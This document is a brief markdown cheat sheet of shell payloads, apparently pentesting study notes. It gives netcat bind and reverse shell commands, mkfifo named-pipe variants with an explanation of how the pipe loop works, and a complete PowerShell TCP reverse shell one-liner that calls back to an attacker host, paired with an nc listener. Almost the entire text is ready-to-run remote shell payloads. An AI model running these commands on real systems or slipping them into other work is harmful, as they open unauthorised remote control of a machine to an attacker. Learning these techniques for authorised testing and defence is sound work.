# Shell Payloads

netcat as a listener for bindshells

### As a listener on the target machine
`nc -lnvp <port> -e /bin/bash` 

Connecting to the above listener with netcat will result in a bind shell on the target.

### reverse shell

Equally with reverse shell connecting back with `nc attacker-host attacker-port -e /bin/bash` would result in a reverse shell on the target.

On linux, we will use this piece of code instead to create a listener for bind shell

`mkfifo /tmp/f;nc -lnvp <PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f`

Explanation:-
- The command creates a `named pipe` at /tmp/f
- Then it starts a netcat listener & connects the input of the listener to the output of the `named pipe`
- The output of the netcat listener(i.e, commands we send) then gets directly piped into `/bin/sh` sending the stderr stream into stdout and sending the stdout itself into the input of the `named pipe`, thus completing the circle.

A very similar command can be used for reverse shells

`mkfifo /tmp/f; nc <attacker-host> <attacker-port> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f`

## Windows host - reverse shell

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

And from the linux host

`sudo nc -lnvp 443`


